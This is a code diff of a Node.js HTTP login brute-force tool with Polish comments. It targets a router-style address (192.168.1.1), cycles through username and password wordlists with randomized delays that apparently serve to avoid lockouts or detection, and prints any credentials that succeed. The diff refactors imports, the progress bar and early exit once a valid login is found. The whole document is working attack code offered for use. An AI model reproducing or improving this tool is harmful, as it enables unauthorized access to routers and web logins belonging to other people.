@@ -1,9 +1,9 @@
-const { spawn } = require('child_process');
-const rp = require('request-promise');
-const fs = require('fs');
-const readline = require('readline');
-const ProgressBar = require('progress');
-const chalk = require('chalk');
+import { spawn } from 'child_process';
+import rp from 'request-promise';
+import fs from 'fs';
+import readline from 'readline';
+import progress from 'progress';
+import chalk from 'chalk';
 
 // Adres URL do logowania HTTP
 const httpLoginURL = 'http://192.168.1.1';
@@ -39,17 +39,15 @@ async function bruteForceHTTPLogin(url) {
         // Utwórz zmienną do przechowywania liczby wszystkich kombinacji
         let totalCount = 0;
 
-        // Utwórz pasek postępu
-        const bar = new ProgressBar('Sprawdzanie [:bar] :percent :etas', {
-            complete: '=',
-            incomplete: ' ',
-            width: 20,
-            total: fs.readFileSync(passwordWordlist, 'utf8').split('\n').length
-        });
+        // Utwórz zmienną do przechowywania paska postępu
+        let bar;
+
+        // Utwórz zmienną do przechowywania flagi, czy znaleziono poprawne dane logowania
+        let found = false;
 
         // Iteruj po każdym użytkowniku
         for await (const user of userReader) {
-            // Pomiń puste użytkowniki
+            // Pomiń puste użytkowników
             if (user === '') continue;
 
             // Utwórz obiekt readline do wczytywania pliku ze słownikiem haseł
@@ -66,7 +64,17 @@ async function bruteForceHTTPLogin(url) {
                 // Zwiększ liczbę wszystkich kombinacji
                 totalCount++;
 
-                // Aktualizuj pasek postępu
+                // Utwórz pasek postępu, jeśli nie istnieje
+                if (!bar) {
+                    bar = new progress('Sprawdzanie [:bar] :percent :etas', {
+                        complete: '=',
+                        incomplete: ' ',
+                        width: 20,
+                        total: totalCount
+                    });
+                }
+
+                // Uaktualnij pasek postępu
                 bar.tick();
 
                 // Użyj losowego opóźnienia między 500 a 1500 milisekund
@@ -89,7 +97,8 @@ async function bruteForceHTTPLogin(url) {
                     if (response.statusCode === 200) {
                         // Znaleziono poprawne dane logowania
                         console.log(chalk.green(`Znaleziono poprawne dane logowania: ${credentials}`));
-                        return; // Zakończ funkcję po znalezieniu poprawnego hasła
+                        found = true;
+                        break; // Zakończ pętlę po znalezieniu poprawnego hasła
                     } else {
                         // Nieudane logowanie
                         console.log(chalk.red(`Nieudane logowanie dla: ${credentials}`));
@@ -106,10 +115,21 @@ async function bruteForceHTTPLogin(url) {
 
             // Zamknij obiekt readline dla haseł
             passwordReader.close();
+
+            // Sprawdź, czy znaleziono poprawne dane logowania
+            if (found) {
+                // Zakończ proces John the Ripper dla użytkowników
+                userReader.close();
+                break; // Zakończ pętlę po znalezieniu poprawnego hasła
+            }
         }
 
         // Sprawdź, czy znaleziono poprawne dane logowania
-        console.log(chalk.red('Nie znaleziono poprawnych danych logowania.'));
+        if (!found) {
+            // Nie znaleziono poprawnych danych logowania
+            console.log(chalk.red('Nie znaleziono poprawnych danych logowania.'));
+        }
+
         // Wyświetl podsumowanie ataku brute force
         console.log(`Sprawdzono ${checkedCount} z ${totalCount} kombinacji.`);
     } catch (error) {
